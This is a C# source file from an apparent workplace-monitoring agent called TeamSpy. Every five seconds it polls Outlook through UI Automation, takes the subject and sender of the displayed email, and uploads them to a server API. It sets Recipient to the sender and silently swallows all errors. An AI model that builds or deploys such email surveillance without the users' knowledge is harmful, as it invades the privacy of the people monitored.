using System;
using System.Diagnostics;
using System.Threading;
using TeamSpy.Agent;
using System.Windows.Automation;

namespace TeamSpy.Agent
{
    public class CommunicationMonitor
    {
        private System.Threading.Timer? _timer;
        private readonly ApiClient _apiClient;
        private string _lastEmailSubject = string.Empty;

        public CommunicationMonitor(ApiClient apiClient)
        {
            _apiClient = apiClient;
        }

        public void Start()
        {
            Console.WriteLine("Starting Communication Monitor...");
            _timer = new System.Threading.Timer(MonitorCommunication, null, 0, 5000); // Check every 5 seconds
        }

        private void MonitorCommunication(object? state)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("outlook");
                if (processes.Length == 0) return;

                foreach (var process in processes)
                {
                    if (process.MainWindowHandle == IntPtr.Zero) continue;

                    AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
                    if (element == null) continue;

                    // This is a highly experimental and fragile way to get email details.
                    // It relies on the UI structure of a specific version of Outlook.
                    var subjectElement = element.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Subject"));
                    var fromElement = element.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "From"));

                    if (subjectElement != null && fromElement != null)
                    {
                        string subject = (string)subjectElement.GetCurrentPropertyValue(ValuePattern.ValueProperty);
                        string from = (string)fromElement.GetCurrentPropertyValue(ValuePattern.ValueProperty);

                        if (subject != _lastEmailSubject)
                        {
                            _ = _apiClient.SendDataAsync("communication", new 
                            {
                                Timestamp = DateTime.Now, 
                                Type = "Email", 
                                Sender = from, 
                                Recipient = from, // Assuming sender is also the recipient for simplicity
                                Subject = subject 
                            });
                            Console.WriteLine($"{DateTime.Now}: Email detected from '{from}' with subject '{subject}'");
                            _lastEmailSubject = subject;
                        }
                    }
                }
            }
            catch (Exception) { /* Ignore exceptions */ }
        }

        public void Stop()
        {
            _timer?.Change(Timeout.Infinite, 0);
            Console.WriteLine("Stopped Communication Monitor.");
        }
    }
}
